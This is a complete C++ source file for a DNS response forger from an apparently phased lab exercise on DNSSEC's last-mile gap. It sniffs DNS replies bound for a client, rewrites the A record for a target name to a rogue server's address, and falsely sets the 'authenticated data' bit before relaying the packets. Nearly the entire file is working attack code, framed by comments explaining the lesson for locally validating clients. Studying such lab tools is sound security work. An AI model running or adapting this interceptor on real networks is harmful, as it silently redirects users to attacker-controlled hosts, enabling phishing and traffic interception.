/*
 * dns_interceptor.cpp — Phase 6 last-mile DNS response forger.
 *
 * Relocated from the resolver subnet (Phases 2-5) to the CLIENT
 * subnet, at 172.16.1.100. edge-router's one diversion route sends
 * every packet addressed to the client (172.16.1.10) through this
 * container instead of delivering it directly -- this is the ONLY
 * mechanism that gets traffic here; there is no ARP spoofing anywhere,
 * and the client's own configuration is completely untouched.
 *
 * ip_forward is left OFF on this container, so nothing reaches the
 * client unless THIS program explicitly relays it: every captured
 * packet is retransmitted out the same interface, with the Ethernet
 * destination corrected to the client's real MAC (kept fresh by a
 * background refresher -- see client_mac_refresher below, carrying
 * forward the exact lesson learned the hard way in Phase 2/3: a MAC
 * cached once at startup goes stale the moment the far side's
 * container restarts, and that looks like total DNS failure with
 * nothing in any log, completely unrelated to forging).
 *
 * The attack itself is mechanically identical to Phase 2's: for the
 * final A-record answer to "example.com", when forging is enabled,
 * the 4 RDATA bytes are overwritten to point at rogue-web. What's
 * different about Phase 6 is WHERE this sits: downstream of a now-
 * validating resolver (Phases 3-5 upstream, untouched), on the one
 * hop DNSSEC's guarantee never covered in the first place -- the
 * resolver-to-stub link. A forged answer here never has to defeat any
 * signature at all, because an ordinary stub never checks one.
 *
 * This interceptor also unconditionally sets the `ad` (authenticated
 * data) bit on any packet it forges -- not because it needs to (an
 * ordinary stub doesn't even look at that bit), but to make the
 * report's point concrete: nothing on this link authenticates that
 * bit either, so an on-path attacker can claim "validated" on an
 * answer it just fabricated, just as easily as it fabricated the
 * answer itself. A locally-validating client (Phase 6's "Client B")
 * ignores this bit entirely and re-derives the truth from the actual
 * signed records it fetches, which is exactly why it isn't fooled.
 *
 * Every other packet is relayed with no change to its DNS content at
 * all.
 *
 * Build: g++ -O2 -std=c++17 -Wall -o dns_interceptor dns_interceptor.cpp -lpcap -lpthread
 * Usage: ./dns_interceptor <iface>
 *   CLIENT_MAC env var ("aa:bb:cc:dd:ee:ff") -- required (seed value;
 *              refreshed automatically afterward).
 *   CLIENT_IP  env var -- default "172.16.1.10".
 *   TARGET_NAME env var -- default "example.com".
 *   ROGUE_IP    env var -- default "172.16.1.30".
 */

#include <array>
#include <cctype>
#include <chrono>
#include <cstdint>
#include <cstdio>
#include <cstdlib>
#include <cstring>
#include <mutex>
#include <optional>
#include <string>
#include <thread>
#include <vector>

#include <arpa/inet.h>
#include <net/if.h>
#include <netinet/in.h>
#include <sys/ioctl.h>
#include <sys/socket.h>
#include <sys/stat.h>
#include <unistd.h>

#include <pcap.h>

namespace {

constexpr int ETH_HDR_LEN = 14;
constexpr const char *FORGE_FLAG_PATH = "/tmp/forge.on";
constexpr size_t MAX_PACKET_SIZE = 2048;
constexpr uint16_t DNS_FLAG_AD_BIT = 0x0020; // bit 5 of the 16-bit flags field (host order)

using MacAddr = std::array<uint8_t, 6>;

#pragma pack(push, 1)
struct EthHdr {
    uint8_t  dst[6];
    uint8_t  src[6];
    uint16_t ethertype;
};
struct IpHdr {
    uint8_t  ver_ihl;
    uint8_t  tos;
    uint16_t tot_len;
    uint16_t id;
    uint16_t frag_off;
    uint8_t  ttl;
    uint8_t  proto;
    uint16_t checksum;
    uint32_t src;
    uint32_t dst;
};
struct UdpHdr { uint16_t sport, dport, len, checksum; };
struct DnsHdr { uint16_t id, flags, qdcount, ancount, nscount, arcount; };
#pragma pack(pop)

MacAddr     g_own_mac{};
std::mutex  g_client_mac_mu;
MacAddr     g_client_mac{};
std::string g_target_name = "example.com";
uint32_t    g_rogue_ip_net = 0;   // network byte order
pcap_t     *g_pcap = nullptr;

MacAddr get_client_mac() {
    std::lock_guard<std::mutex> lk(g_client_mac_mu);
    return g_client_mac;
}

void set_client_mac(const MacAddr &m) {
    std::lock_guard<std::mutex> lk(g_client_mac_mu);
    g_client_mac = m;
}

// ---------- helpers ----------

std::optional<MacAddr> parse_mac(const std::string &s) {
    unsigned int b[6];
    if (sscanf(s.c_str(), "%x:%x:%x:%x:%x:%x", &b[0],&b[1],&b[2],&b[3],&b[4],&b[5]) != 6)
        return std::nullopt;
    MacAddr out{};
    for (int i = 0; i < 6; i++) out[i] = static_cast<uint8_t>(b[i]);
    return out;
}

std::optional<MacAddr> get_own_mac(const std::string &iface) {
    int fd = socket(AF_INET, SOCK_DGRAM, 0);
    if (fd < 0) return std::nullopt;
    struct ifreq ifr{};
    std::strncpy(ifr.ifr_name, iface.c_str(), IFNAMSIZ - 1);
    if (ioctl(fd, SIOCGIFHWADDR, &ifr) < 0) { close(fd); return std::nullopt; }
    MacAddr out{};
    std::memcpy(out.data(), ifr.ifr_hwaddr.sa_data, 6);
    close(fd);
    return out;
}

// Internet checksum (RFC 1071) over an array of 16-bit words already in
// network byte order: convert each to host order to sum, then convert
// the complemented sum back to network order for storage.
uint16_t checksum_words(const uint16_t *buf, int nwords) {
    uint32_t sum = 0;
    for (int i = 0; i < nwords; i++) sum += ntohs(buf[i]);
    while (sum >> 16) sum = (sum & 0xFFFF) + (sum >> 16);
    uint16_t result = static_cast<uint16_t>(~sum);
    return htons(result == 0 ? 0xFFFF : result);
}

uint16_t ip_checksum(IpHdr ip /* by value: checksum field zeroed locally */) {
    ip.checksum = 0;
    return checksum_words(reinterpret_cast<uint16_t *>(&ip), sizeof(ip) / 2);
}

uint16_t udp_checksum(const IpHdr &ip, const UdpHdr &udp,
                       const uint8_t *payload, int paylen) {
    struct Pseudo {
        uint32_t src, dst;
        uint8_t  zero, proto;
        uint16_t udplen;
    } __attribute__((packed));

    int total = static_cast<int>(sizeof(Pseudo)) + ntohs(udp.len);
    int padded = (total + 1) & ~1;
    std::vector<uint8_t> buf(padded, 0);

    Pseudo ph{ip.src, ip.dst, 0, 17 /* UDP */, udp.len};
    std::memcpy(buf.data(), &ph, sizeof(ph));

    UdpHdr udp_copy = udp;
    udp_copy.checksum = 0;
    std::memcpy(buf.data() + sizeof(ph), &udp_copy, sizeof(udp_copy));

    if (paylen > 0)
        std::memcpy(buf.data() + sizeof(ph) + sizeof(udp_copy), payload, paylen);

    return checksum_words(reinterpret_cast<uint16_t *>(buf.data()), padded / 2);
}

// Skip one DNS name at buf+offset (compression pointer or ordinary
// labels). Returns bytes consumed, or -1 if malformed.
int dns_name_len(const uint8_t *buf, int offset, int buflen) {
    const int start = offset;
    while (offset < buflen) {
        uint8_t b = buf[offset];
        if ((b & 0xC0) == 0xC0) {
            if (offset + 2 > buflen) return -1;
            return (offset - start) + 2;
        } else if (b == 0) {
            return (offset - start) + 1;
        } else if ((b & 0xC0) == 0) {
            if (offset + 1 + b > buflen) return -1;
            offset += 1 + b;
        } else {
            return -1;
        }
    }
    return -1;
}

// Decode the (uncompressed) question-section QNAME into a lowercase
// dotted string. Returns bytes consumed, or -1 on error.
int decode_qname(const uint8_t *buf, int offset, int buflen, std::string &out) {
    const int start = offset;
    out.clear();
    while (offset < buflen) {
        uint8_t b = buf[offset];
        if (b == 0) { offset += 1; break; }
        if ((b & 0xC0) == 0xC0) return -1; // not expected in a question
        if (offset + 1 + b > buflen) return -1;
        if (!out.empty()) out += '.';
        for (int i = 0; i < b; i++)
            out += static_cast<char>(std::tolower(buf[offset + 1 + i]));
        offset += 1 + b;
    }
    return offset - start;
}

bool forging_is_on() {
    struct stat st;
    return stat(FORGE_FLAG_PATH, &st) == 0;
}

// Re-resolve the client's current MAC via the kernel's neighbor table,
// forcing a fresh ARP round-trip first with BOTH ping and arping (see
// Phase 2/3's dns_interceptor.cpp for why plain ping alone proved
// insufficient against a stale NUD entry in practice). Reads the
// neighbor table in the SAME unfiltered form ("ip neigh show <ip>",
// not "... dev <iface>") that keeps the MAC at column $5 -- the
// filtered form silently drops a column and was the actual root cause
// of the Phase 2 MAC refresher looking broken the first time around.
std::optional<MacAddr> resolve_client_mac(const std::string &iface, const std::string &client_ip) {
    std::string ping_cmd = "ping -c1 -W1 " + client_ip + " >/dev/null 2>&1";
    if (std::system(ping_cmd.c_str()) != 0) { /* best-effort refresh; fall through regardless */ }
    std::string arping_cmd = "arping -c1 -w1 -I " + iface + " " + client_ip + " >/dev/null 2>&1";
    if (std::system(arping_cmd.c_str()) != 0) { /* best-effort refresh; fall through regardless */ }

    std::string cmd = "ip neigh show " + client_ip +
                       " 2>/dev/null | awk '{print $5}' | head -n1";
    FILE *fp = popen(cmd.c_str(), "r");
    if (!fp) return std::nullopt;
    char buf[64] = {0};
    char *line = fgets(buf, sizeof(buf), fp);
    pclose(fp);
    if (!line) return std::nullopt;
    std::string s(buf);
    while (!s.empty() && (s.back() == '\n' || s.back() == '\r')) s.pop_back();
    if (s.empty()) return std::nullopt;
    return parse_mac(s);
}

// Runs for the life of the process: keeps g_client_mac current so a
// client container restart/recreate (which can change its MAC)
// doesn't permanently blackhole every relayed frame at L2.
void client_mac_refresher(std::string iface, std::string client_ip) {
    while (true) {
        std::this_thread::sleep_for(std::chrono::seconds(2));
        auto mac = resolve_client_mac(iface, client_ip);
        if (!mac) continue;
        if (*mac != get_client_mac()) {
            char hex[32];
            snprintf(hex, sizeof(hex), "%02x:%02x:%02x:%02x:%02x:%02x",
                     (*mac)[0], (*mac)[1], (*mac)[2], (*mac)[3], (*mac)[4], (*mac)[5]);
            fprintf(stderr, "[attacker] client MAC changed -> %s\n", hex);
            set_client_mac(*mac);
        }
    }
}

// ---------- per-packet handling ----------

void handle_packet(u_char *, const struct pcap_pkthdr *h, const u_char *bytes) {
    const size_t min_len = ETH_HDR_LEN + sizeof(IpHdr) + sizeof(UdpHdr) + sizeof(DnsHdr);
    if (h->caplen < min_len || h->caplen > MAX_PACKET_SIZE) return;

    uint8_t pkt[MAX_PACKET_SIZE];
    std::memcpy(pkt, bytes, h->caplen);
    const int caplen = static_cast<int>(h->caplen);

    auto *eth = reinterpret_cast<EthHdr *>(pkt);
    if (ntohs(eth->ethertype) != 0x0800) return; // IPv4 only

    auto *ip = reinterpret_cast<IpHdr *>(pkt + ETH_HDR_LEN);
    const int ihl = (ip->ver_ihl & 0x0F) * 4;
    if (ip->proto != 17) return; // UDP only

    auto *udp = reinterpret_cast<UdpHdr *>(pkt + ETH_HDR_LEN + ihl);
    uint8_t *dns_start = pkt + ETH_HDR_LEN + ihl + sizeof(UdpHdr);

    const int udp_declared_len = ntohs(udp->len);
    const int captured_avail   = caplen - static_cast<int>(ETH_HDR_LEN + ihl + sizeof(UdpHdr));
    int dns_len = udp_declared_len - static_cast<int>(sizeof(UdpHdr));
    if (dns_len < 0 || dns_len > captured_avail) dns_len = captured_avail;
    if (dns_len < static_cast<int>(sizeof(DnsHdr))) return;

    auto *dns = reinterpret_cast<DnsHdr *>(dns_start);
    const uint16_t flags = ntohs(dns->flags);
    const bool qr = (flags >> 15) & 1;
    const int ancount = ntohs(dns->ancount);
    const int qdcount = ntohs(dns->qdcount);

    auto send_it = [&]() {
        const MacAddr client_mac = get_client_mac();
        std::memcpy(eth->dst, client_mac.data(), 6);
        std::memcpy(eth->src, g_own_mac.data(), 6);
        ip->checksum  = ip_checksum(*ip);
        udp->checksum = udp_checksum(*ip, *udp, dns_start, dns_len);
        pcap_inject(g_pcap, pkt, caplen);
    };

    if (!qr || qdcount < 1) { send_it(); return; }

    int off = sizeof(DnsHdr);
    std::string qname;
    const int namelen = decode_qname(dns_start, off, dns_len, qname);
    bool is_target = false;
    if (namelen > 0) {
        off += namelen;
        if (off + 4 <= dns_len) {
            const int qtype = (dns_start[off] << 8) | dns_start[off + 1];
            off += 4; // QTYPE + QCLASS
            if (qtype == 1 /* A */ && strcasecmp(qname.c_str(), g_target_name.c_str()) == 0)
                is_target = true;
        }
    }

    if (is_target && ancount >= 1 && forging_is_on()) {
        int aoff = off;
        for (int i = 0; i < ancount && aoff < dns_len; i++) {
            const int nlen = dns_name_len(dns_start, aoff, dns_len);
            if (nlen < 0) break;
            const int rhdr = aoff + nlen;
            if (rhdr + 10 > dns_len) break;
            const uint16_t rtype  = (dns_start[rhdr] << 8) | dns_start[rhdr + 1];
            const uint16_t rclass = (dns_start[rhdr + 2] << 8) | dns_start[rhdr + 3];
            const uint16_t rdlen  = (dns_start[rhdr + 8] << 8) | dns_start[rhdr + 9];
            const int rdata_off = rhdr + 10;
            if (rtype == 1 && rclass == 1 && rdlen == 4 && rdata_off + 4 <= dns_len) {
                std::memcpy(dns_start + rdata_off, &g_rogue_ip_net, 4);
                // Claim "validated" on an answer we just fabricated --
                // nothing on this link authenticates this bit either.
                dns->flags = htons(static_cast<uint16_t>(ntohs(dns->flags) | DNS_FLAG_AD_BIT));
                fprintf(stderr, "[forge] %s A -> rogue-web, ad=1 (txid 0x%04x)\n", qname.c_str(), ntohs(dns->id));
                break;
            }
            aoff = rdata_off + rdlen;
        }
    }

    send_it();
}

} // namespace

int main(int argc, char **argv) {
    if (argc < 2) {
        fprintf(stderr, "usage: %s <iface>\n", argv[0]);
        return 1;
    }
    const std::string iface = argv[1];

    const char *mac_env = getenv("CLIENT_MAC");
    if (!mac_env) {
        fprintf(stderr, "CLIENT_MAC env var missing (expected aa:bb:cc:dd:ee:ff)\n");
        return 1;
    }
    auto client_mac = parse_mac(mac_env);
    if (!client_mac) {
        fprintf(stderr, "CLIENT_MAC invalid: %s\n", mac_env);
        return 1;
    }
    set_client_mac(*client_mac);

    const char *client_ip_env = getenv("CLIENT_IP");
    const std::string client_ip = client_ip_env ? client_ip_env : "172.16.1.10";

    auto own_mac = get_own_mac(iface);
    if (!own_mac) {
        fprintf(stderr, "could not read MAC of %s\n", iface.c_str());
        return 1;
    }
    g_own_mac = *own_mac;

    if (const char *target = getenv("TARGET_NAME")) g_target_name = target;

    const char *rogue = getenv("ROGUE_IP");
    if (!rogue) rogue = "172.16.1.30";
    struct in_addr a{};
    if (inet_aton(rogue, &a) == 0) {
        fprintf(stderr, "invalid ROGUE_IP %s\n", rogue);
        return 1;
    }
    g_rogue_ip_net = a.s_addr;

    char errbuf[PCAP_ERRBUF_SIZE];
    // A short (1ms) read timeout keeps our relay latency minimal -- see
    // Phase 2/3's dns_interceptor.cpp for the full reasoning (a longer
    // timeout risks relaying an answer to a query the real client has
    // already abandoned and retried with a fresh transaction ID).
    g_pcap = pcap_open_live(iface.c_str(), 65535, 1 /*promisc*/, 1 /*ms*/, errbuf);
    if (!g_pcap) {
        fprintf(stderr, "pcap_open_live(%s): %s\n", iface.c_str(), errbuf);
        return 1;
    }

    struct bpf_program fp;
    const std::string filter_str =
        "ip and udp and src port 53 and dst host " + client_ip;
    if (pcap_compile(g_pcap, &fp, filter_str.c_str(), 0, PCAP_NETMASK_UNKNOWN) < 0 ||
        pcap_setfilter(g_pcap, &fp) < 0) {
        fprintf(stderr, "BPF filter error: %s\n", pcap_geterr(g_pcap));
        return 1;
    }
    pcap_freecode(&fp);

    std::thread refresher(client_mac_refresher, iface, client_ip);
    refresher.detach();

    fprintf(stderr, "[attacker] up on %s, target=%s, rogue=%s, client=%s, forging=%s\n",
            iface.c_str(), g_target_name.c_str(), rogue, client_ip.c_str(),
            forging_is_on() ? "ON" : "OFF");

    pcap_loop(g_pcap, -1, handle_packet, nullptr);
    pcap_close(g_pcap);
    return 0;
}
